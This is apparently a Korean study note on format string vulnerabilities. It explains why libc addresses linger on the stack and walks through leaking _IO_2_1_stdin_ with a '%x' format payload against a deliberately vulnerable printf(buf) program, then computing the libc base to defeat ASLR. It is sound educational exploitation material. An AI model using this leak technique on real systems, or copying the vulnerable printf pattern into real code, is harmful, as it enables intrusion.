# Format String Vulnerability - libc leak

## 1. libc 개요

**libc (C standard library)** 는 `printf`, `puts`, `system`, `malloc` 같은 표준 C 함수들의 실제 구현이 들어있는 **공유 라이브러리**다.

프로그램 실행 시:

- main 바이너리와는 별도로
- libc.so.6 파일이 메모리에 로드되고
- 함수 호출 시 libc 내부 코드로 점프한다.

libc는 메모리에서 보통 다음과 같은 영역으로 매핑된다.

- r-xp : 코드 영역 (`.text`)
- r--p : read-only 데이터 (`.rodata`)
- rw-p : 전역 변수 (`.data`, `.bss`)

---

## 2. 스택에 libc 내부 값이 남는 이유

### 2.1 `printf` 호출 흐름과 libc 내부 호출

다음 코드가 실행되면:

```c
printf(buf);
```

실제 호출 흐름은 다음과 같다.

```
main
 └─ call printf@plt
       └─ libc의 실제 printf로 jump
             └─ libc 내부 함수/구조체들을 연쇄적으로 call
```

#### (1) `call printf@plt`

- `call` 명령어는 **return address를 스택에 push**
- 이 return address는 **main 내부 주소**이다.

#### (2) PLT → libc `printf`

- `printf@plt`는 중계 역할만 수행
- 새로운 return address를 push하지 않고
- libc에 로드된 실제 `printf` 코드로 jump한다.

#### (3) libc 내부 `printf` 실행

libc의 `printf`는 단일 함수가 아니라, 내부에서 다음과 같은 작업을 수행한다.

- 포맷 문자열 파싱
- 가변 인자 처리
- 출력 버퍼 관리
- FILE 구조체(`stdout`, `stdin`) 접근
- 내부 헬퍼 함수 호출

이 과정에서 libc 내부에서는 여러 번 `call`이 발생하며,
그때마다 **libc 내부 주소를 가리키는 return address** 
또는 **libc 전역 구조체 포인터**가 스택에 push된다.

> **노트 : PLT와 GOT**
> 
> 프로그램에서 `printf(buf)`가 호출될 때, 실제로는 다음과 같은 흐름을 따른다.
> ```
> main
> └─ call printf@plt
>       └─ GOT[printf] 참조
>             └─ libc 내부 printf 코드로 jump
> ```
> - printf@plt는 바이너리 내부에 존재하는 중계용 코드이며
> - 실제 libc 함수 주소는 GOT(Global Offset Table) 에 저장된다.
>
> ASLR이 활성화된 환경에서는:
> - libc는 실행 시마다 다른 주소에 로드되며
> - GOT에는 그 실행 시점의 libc 함수 주소가 기록된다.

### 2.2 cdecl 호출 규약과 스택에 값이 남는 이유

x86 cdecl 호출 규약의 특징은 다음과 같다.

- 함수 인자는 **caller가 push**
- 함수 종료 후 인자 정리는 **caller가 `add esp, ...`로 수행**
- `ret`은 **return address를 pop하며 esp만 이동**
- 스택 메모리의 값 자체는 지우지 않는다.

따라서:

- libc 내부 함수 호출 중 생성된 return address
- libc 전역 구조체 포인터 (`_IO_2_1_stdin_`, `_IO_2_1_stdout_`)
- 이전 함수 호출의 인자 값

이들은 **논리적으로는 사용이 끝났지만,
물리적인 스택 메모리에는 그대로 남아 있을 수 있다.**



### 2.3 Format String Vulnerability와의 연결

`printf(buf)`처럼 포맷 문자열을 사용자 입력으로 넘기면:

- printf는 가변 인자를 기대하고
- 실제로는 존재하지 않는 인자 위치까지
- 스택에서 값을 읽어 출력한다.

이때 출력되는 값 중에는:

- libc 내부 return address
- libc 전역 객체 주소
- libc 내부 포인터

등이 포함될 수 있으며,
이것이 **libc leak**의 근본 원인이다.


---

## 3. libc leak (Format String Vulnerability)

취약 코드 예시:

```c
printf(buf);
```

이 경우:

- printf는 가변 인자 함수
- 포맷 문자열에 `%x`, `%p` 등이 있으면
- **존재하지 않는 인자까지 스택에서 읽어버린다**

그 결과:

- main의 지역 변수
- stack 주소
- libc 내부 return address
- libc 전역 객체 주소

등이 출력된다.

이것이 **libc leak** 이다.



> **노트 : libc leak의 정체**
> 
> leak되는 libc 주소는 반드시 코드 주소일 필요는 없다.
> 
> 예시:
> 
> - libc 내부 함수 주소
> - `__libc_start_main` 관련 주소
> - `_IO_2_1_stdin_`, `_IO_2_1_stdout_` 같은 libc 전역 FILE 구조체
> 
> 중요한 점은:
> 
> **libc 내부에 속한 주소 하나만 leak 되면 충분하다.**

---

## 4. libc offset 찾기 & libc base 계산 (실습)

이 섹션에서는 실제 Format String Vulnerability 실습 과정에서
**libc leak → offset 확인 → libc base 계산**까지의 흐름을 예시로 정리한다.

#### 실습 코드
``` c
int main() {
    char buf[100];
    puts("input:");
    fgets(buf, sizeof(buf), stdin);
    printf(buf);
    return 0;
}
```

#### 환경
- ASLR on
- No pie
- NX on
- No Stack Canary

### 4.1 libc 주소 leak 확인

개념 이해를 위해 먼저 GDB로 스택을 직접 관찰했다.

우선 call printf@plt까지만 진행한 뒤 스택을 확인했다.
```
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
input:
AAAA

Breakpoint 1, 0x080491d6 in main () at vuln.c:9
9	    printf(buf);
(gdb) si
0x08049040 in printf@plt ()
(gdb) x/10wx $esp
0xffffcdec:	0x080491db	0xffffce0c	0x00000064	0xf7fa65c0
0xffffcdfc:	0x0804919d	0xf7ffdb8c	0x00000001	0xf7fc1720
0xffffce0c:	0x41414141	0x0000000a
```

`x/10wx $esp`의 출력을 바탕으로 다음과 같은 상태를 추측할 수 있다.

```
+--------------+
│  0x080491db  │ printf@plt의 retrun addr : main 내부
+--------------+
│  0xffffce0c  │ printf@plt의 인자 &buf
+--------------+
│  0x00000064  │ ???
+--------------+
│  0xf7fa65c0  │ 스택에 남아있는 libc 내부 값
+--------------+
│      ...     │
+--------------+
│  0x41414141  │ 실제 buf slot에 기록되어 있는 AAAA
+--------------+
```

GDB에서 libc 내부 주소로 의심되는 것을 확인하면:

```gdb
(gdb) x/i 0xf7fa65c0
0xf7fa65c0 <_IO_2_1_stdin_>: mov BYTE PTR [edx],ah
```

→ leak된 값은 **libc 내부 전역 객체 `_IO_2_1_stdin_`의 주소**임을 알 수 있다.

---

### 4.2 leak된 주소가 libc 영역임을 확인

```gdb
(gdb) info proc mappings
```

출력 일부:

```text
0xf7d75000 0xf7d98000 r--p /usr/lib/i386-linux-gnu/libc.so.6
0xf7d98000 0xf7f1f000 r-xp /usr/lib/i386-linux-gnu/libc.so.6
0xf7fa6000 0xf7fa7000 rw-p /usr/lib/i386-linux-gnu/libc.so.6
```

- leak 주소 `0xf7fa65c0`는
- `rw-p` 영역에 포함되며
- libc의 `.data/.bss` 영역임을 확인할 수 있다.

---

### 4.3 libc 내부 offset 확인

libc 파일에서 `_IO_2_1_stdin_`의 offset을 확인한다.

```bash
$ nm -D /usr/lib/i386-linux-gnu/libc.so.6 | grep IO_2_1
00231ca0 D _IO_2_1_stderr_@@GLIBC_2.1
002315c0 D _IO_2_1_stdin_@@GLIBC_2.1
00231d40 D _IO_2_1_stdout_@@GLIBC_2.1
```

→ `_IO_2_1_stdin_`의 offset은 `0x2315c0`

---

### 4.4 libc base 계산

libc 내부 주소는 다음 관계를 따른다.

```
실제 주소 = libc base + offset
```

따라서:

```text
leak   = 0xf7fa65c0
offset = 0x2315c0
```

```text
libc_base = leak - offset
          = 0xf7fa65c0 - 0x2315c0
          = 0xf7d75000
```

---

### 4.5 계산 결과 검증

`info proc mappings`에서 확인한 libc의 시작 주소는 다음과 같다.

```text
0xf7d75000 0xf7d98000 r--p /usr/lib/i386-linux-gnu/libc.so.6
```

→ 계산한 `libc_base = 0xf7d75000`과 일치한다.

---

### 실습 메모 (ASLR 관련)

본 실습은 ASLR을 끄지 않은 상태(`randomize_va_space = 2`)에서 진행되었다.

```bash
$ cat /proc/sys/kernel/randomize_va_space
2
```

Format String Vulnerability를 이용해 프로그램 출력으로 스택 값을 leak 한 결과는 다음과 같다.

```text
$ ./vuln
input:
AAAA.%x.%x.%x.%x.%x.%x.%x.%x
AAAA.64.f38625c0.804919d.f38b9b8c.1.f387d720.41414141.2e78252e
```

- 실행할 때마다 leak되는 주소 값은 달라진다.
- `0xf3xxxxxx` 형태의 값은 libc 영역에 속한 주소이다.
- ASLR이 활성화되어 있어도 **libc 내부 주소 하나만 leak 되면** offset을 통해 libc base를 계산할 수 있다.

즉, ASLR은 libc의 base 주소만 랜덤화할 뿐, leak이 가능한 경우 libc base는 항상 복구 가능하다.
